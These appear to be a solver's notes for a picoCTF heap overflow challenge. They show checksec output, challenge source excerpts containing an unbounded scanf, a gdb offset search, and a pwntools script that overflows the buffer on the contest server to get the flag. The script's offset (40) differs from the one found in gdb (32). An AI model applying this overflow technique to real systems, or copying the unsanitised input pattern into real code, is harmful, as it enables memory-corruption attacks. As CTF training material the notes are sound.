$ file chall                                                                                                     
chall: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=2015ade3c2b89f5069cb8c54dd750d1b9849062d, for GNU/Linux 3.2.0, with debug_info, not stripped

$ checksec --file chall                                                                                          
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No
    Debuginfo:  Yes

$ cat chall.c                                                                                                    
.....

int num_allocs;
char *safe_var;
char *input_data;

void check_win() {
    if (strcmp(safe_var, "bico") != 0) {
        printf("\nYOU WIN\n");

        // Print flag
        char buf[FLAGSIZE_MAX];
        FILE *fd = fopen("flag.txt", "r");
        fgets(buf, FLAGSIZE_MAX, fd);
        printf("%s\n", buf);
        fflush(stdout);

.....

void write_buffer() {
    printf("Data for buffer: ");
    fflush(stdout);
    scanf("%s", input_data); ## nice - unsanitised. Easy buffer overflow
}
.....

It's buffer overflow, so let's see what's what:
$gdb ./chall
  >cyclic 100
  > r
select write to buffer. insert payload. inspect heap.  
  0x5555555596d0  ->   eaaaaaaafaaaaaaagaaaaaaahaaaaaaa1
aaaaaajaaaaaaakaaaaaaalaaaaaaamaaa  
 cyclic -l eaaaaaaa

Finding cyclic pattern of 8 bytes: b'eaaaaaaa' (hex: 0x6561616161616161)
Found at offset 32

Ace. Pretty sure any old non-bico value will trigger win. so  i sent 50 A's, however, the script is better:


#########

#!/usr/bin/env python3
from pwn import *

offset = 40  # <-- Change this to the correct offset as needed

# Connect to the remote service.
r = remote('tethys.picoctf.net', 65488)

# Wait for the initial prompt.
r.recvuntil(b"Enter your choice:")

# Send "2" to select the option for writing to the buffer
r.sendline(b"2")

# Build the payload: 'offset' junk bytes followed by DEADBEEF.
# p32 packs the value into 4 bytes (little-endian).
payload = b"A" * offset + p32(0xDEADBEEF)
r.sendline(payload)

# Wait for the prompt again.
r.recvuntil(b"Enter your choice:")

# Send "4" to request flag.
r.sendline(b"4")


output = r.recvall(timeout=2)

# Look for the "YOU WIN" marker and extract everything following it.
marker = b"YOU WIN"
index = output.find(marker)
if index != -1:
    flag = output[index + len(marker):].strip()
    print("Flag is:", flag.decode())
else:
    print("Marker 'YOU WIN' not found in output!")


